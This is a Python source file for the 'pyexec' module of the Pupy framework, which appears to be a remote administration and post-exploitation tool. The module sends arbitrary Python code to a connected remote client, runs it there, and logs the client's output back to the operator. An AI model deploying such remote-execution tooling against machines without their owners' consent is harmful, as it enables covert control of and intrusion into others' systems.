# -*- coding: UTF8 -*-
from pupylib.PupyModule import *
import StringIO
from pupylib.utils.rpyc_utils import redirected_stdo

__class_name__="PythonExec"

class PythonExec(PupyModule):
	""" execute python code on a remote system """
	def init_argparse(self):
		self.arg_parser = PupyArgumentParser(prog='pyexec', description=self.__doc__)
		group=self.arg_parser.add_mutually_exclusive_group(required=True)
		group.add_argument('--file', metavar="<path>", help="execute code from .py file")
		group.add_argument('-c','--code', metavar='<code string>', help="execute python oneliner code. ex : 'import platform;print platform.uname()'")

	def run(self, args):
		code=""
		if args.file:
			self.info("loading code from %s ..."%args.file)
			with open(args.file,'r') as f:
				code=f.read()
		else:
			code=args.code
		stdout=StringIO.StringIO()
		stderr=StringIO.StringIO()
		try:
			with redirected_stdo(self.client.conn, stdout, stderr):
				self.client.conn.execute(code+"\n")
			res=stdout.getvalue()
			err=stderr.getvalue()
			if err.strip():
				err="\n"+err
			self.rawlog(res+err)
		finally:
			stdout.close()
			stderr.close()

